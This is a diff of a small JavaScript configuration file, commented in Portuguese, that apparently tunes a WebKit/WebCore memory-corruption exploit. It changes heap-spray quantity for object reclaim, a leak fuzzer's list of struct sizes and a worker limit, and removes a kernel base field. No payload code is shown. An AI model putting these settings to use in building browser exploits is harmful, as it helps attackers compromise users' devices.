@@ -1,16 +1,18 @@
-// CONFIGURAÇÃO DINÂMICA
 export const CONFIG = {
-    // Definido como NULL. O script deve encontrar isso sozinho.
-    KERNEL_BASE: null, 
-    
-    // Limite de estabilidade (Mantido 403 conforme seus testes)
+    // Limite de segurança (Zona de Pressão)
     WORKER_LIMIT: 403,
     
-    // Tamanhos para o Fuzzer de Leak
-    // Focamos em tamanhos de structs do sistema (WebCore)
-    SIZES_TO_TEST: [0x20, 0x40, 0x80, 0x100, 0x180, 0x200, 0x400, 0x800, 0x1000],
-    
-    SPRAY_QUANTITY: 5000
+    // Quantidade de sprays para Reclaim (Aumentado para garantir)
+    SPRAY_QUANTITY: 8000,
+
+    // Lista de tamanhos para testar (Focada em structs do WebCore)
+    // 0x20, 0x40, 0x100 são comuns para objetos pequenos.
+    // 0x400, 0x800 são comuns para objetos médios.
+    SIZES_TO_TEST: [
+        0x20, 0x30, 0x40, 0x60, 0x80, 
+        0x100, 0x180, 0x200, 0x280, 
+        0x400, 0x600, 0x800, 0x1000
+    ]
 };
 
 // OFFSETS (Seus números extraídos - Mantidos para uso futuro)
